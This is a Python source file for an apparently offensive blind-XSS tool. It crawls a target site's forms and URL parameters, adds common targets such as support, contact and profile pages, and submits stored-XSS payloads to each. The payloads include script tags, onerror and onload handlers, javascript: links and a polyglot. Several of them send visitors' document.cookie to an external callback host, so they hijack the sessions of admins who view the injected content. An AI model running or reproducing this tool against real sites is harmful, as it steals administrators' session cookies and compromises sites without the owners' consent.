#!/usr/bin/env python3
"""
blind_xss.py — Blind XSS Payload Deployer

Injects callback-based XSS payloads into all input points.
When an admin views the injected content, the payload fires back.
Uses interactsh or custom callback URL.

Usage:
    from blind_xss import BlindXSSHunter
    hunter = BlindXSSHunter(callback_url="xxx.oast.fun")
    results = hunter.inject_all("https://target.com")
"""
import json
import os
import re
import time
from pathlib import Path
from urllib.parse import urlparse, urljoin, urlencode

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    requests = None
    BeautifulSoup = None


class BlindXSSHunter:
    """Deploy blind XSS payloads across all injection points."""

    def __init__(self, callback_url: str = ""):
        self.callback_url = callback_url or os.environ.get("INTERACTSH_URL", "")
        self.findings = []
        self.injections = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            import urllib3
            urllib3.disable_warnings()

    def _payloads(self, label: str = "") -> list[str]:
        """Generate blind XSS payloads with callback."""
        cb = self.callback_url
        tag = label or "bxss"
        if not cb:
            cb = "burpcollaborator.net"  # placeholder

        return [
            # Basic script
            f'"><script src=https://{tag}.{cb}></script>',
            # IMG onerror
            f'"><img src=x onerror="fetch(\'https://{tag}.{cb}/?\'+document.cookie)">',
            # SVG onload
            f'"><svg/onload="fetch(\'https://{tag}.{cb}/?\'+document.domain)">',
            # Event handlers
            f'" onfocus="fetch(\'https://{tag}.{cb}\')" autofocus="',
            # Input events
            f'" onmouseover="fetch(\'https://{tag}.{cb}/?\'+document.cookie)" ',
            # JavaScript protocol
            f'javascript:fetch("https://{tag}.{cb}/?"+document.cookie)//',
            # Markdown injection (for markdown-rendered fields)
            f'[Click](javascript:fetch("https://{tag}.{cb}/?"+document.cookie))',
            # Template injection fallback
            f'${{fetch("https://{tag}.{cb}/?"+document.cookie)}}',
            # Polyglot
            f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch("https://{tag}.{cb}") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch("https://{tag}.{cb}/?"+document.cookie)//>//',
        ]

    def find_injection_points(self, url: str,
                              headers: dict = None) -> list[dict]:
        """Find all input fields in a page."""
        headers = headers or {}
        points = []

        try:
            resp = self.session.get(url, headers=headers, timeout=10)
            if not BeautifulSoup:
                return points

            soup = BeautifulSoup(resp.text, "html.parser")

            # Forms
            for form in soup.find_all("form"):
                action = urljoin(url, form.get("action", url))
                method = form.get("method", "GET").upper()

                for inp in form.find_all(["input", "textarea", "select"]):
                    inp_name = inp.get("name", "")
                    inp_type = inp.get("type", "text").lower()

                    if inp_type in ("hidden", "submit", "button", "file",
                                   "checkbox", "radio"):
                        continue
                    if inp_name:
                        points.append({
                            "url": action,
                            "method": method,
                            "param": inp_name,
                            "type": "form",
                        })

            # URL parameters detected from links
            for link in soup.find_all("a", href=True):
                href = link["href"]
                if "?" in href and "=" in href:
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    for param in parsed.query.split("&"):
                        if "=" in param:
                            name = param.split("=")[0]
                            points.append({
                                "url": full_url.split("?")[0],
                                "method": "GET",
                                "param": name,
                                "type": "url_param",
                            })

        except Exception:
            pass

        # Common blind XSS targets (support tickets, contact forms, user profiles)
        blind_targets = [
            {"path": "/support", "fields": ["subject", "message", "body"]},
            {"path": "/contact", "fields": ["name", "email", "message"]},
            {"path": "/feedback", "fields": ["feedback", "comment"]},
            {"path": "/profile", "fields": ["name", "bio", "about", "website"]},
            {"path": "/settings", "fields": ["display_name", "description"]},
            {"path": "/api/support/tickets", "fields": ["subject", "body"]},
        ]

        base = url.rstrip("/")
        for target in blind_targets:
            target_url = f"{base}{target['path']}"
            for field in target["fields"]:
                points.append({
                    "url": target_url,
                    "method": "POST",
                    "param": field,
                    "type": "blind_target",
                })

        return points

    def inject(self, point: dict, headers: dict = None) -> dict:
        """Inject blind XSS into a single injection point."""
        headers = headers or {}
        result = {
            "url": point["url"],
            "param": point["param"],
            "method": point["method"],
            "injected": False,
            "payloads_sent": 0,
        }

        label = f"{point['param'][:8]}"
        payloads = self._payloads(label)

        for payload in payloads[:3]:  # Top 3 payloads per point
            try:
                if point["method"] == "GET":
                    resp = self.session.get(
                        point["url"],
                        params={point["param"]: payload},
                        headers=headers, timeout=8)
                else:
                    # Try JSON
                    try:
                        resp = self.session.post(
                            point["url"],
                            json={point["param"]: payload},
                            headers={**headers,
                                    "Content-Type": "application/json"},
                            timeout=8)
                    except Exception:
                        pass

                    # Also try form data
                    resp = self.session.post(
                        point["url"],
                        data={point["param"]: payload},
                        headers=headers, timeout=8)

                result["payloads_sent"] += 1

                if resp.status_code in (200, 201, 302, 301):
                    result["injected"] = True

                    # Check for reflection (non-blind)
                    if payload in resp.text:
                        result["reflected"] = True

            except Exception:
                continue

            time.sleep(0.3)

        if result["injected"]:
            self.injections.append(result)

        return result

    def inject_all(self, url: str, headers: dict = None) -> dict:
        """Inject into all discovered injection points."""
        headers = headers or {}
        points = self.find_injection_points(url, headers)

        results = {
            "url": url,
            "injection_points": len(points),
            "payloads_sent": 0,
            "successful_injections": 0,
            "reflected": 0,
        }

        for point in points[:30]:  # Cap at 30 points
            r = self.inject(point, headers)
            results["payloads_sent"] += r.get("payloads_sent", 0)
            if r.get("injected"):
                results["successful_injections"] += 1
            if r.get("reflected"):
                results["reflected"] += 1

        if results["reflected"] > 0:
            self.findings.append({
                "type": "reflected_xss",
                "severity": "HIGH",
                "reflected_count": results["reflected"],
            })

        results["callback_url"] = self.callback_url
        results["note"] = (
            "Blind XSS payloads deployed. Check interactsh/callback "
            "server for incoming connections from admin panels.")

        return results

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/blind_xss")
        out_dir.mkdir(parents=True, exist_ok=True)
        data = {"injections": self.injections, "findings": self.findings}
        out_file = out_dir / f"blind_xss_{int(time.time())}.json"
        out_file.write_text(json.dumps(data, indent=2, default=str))
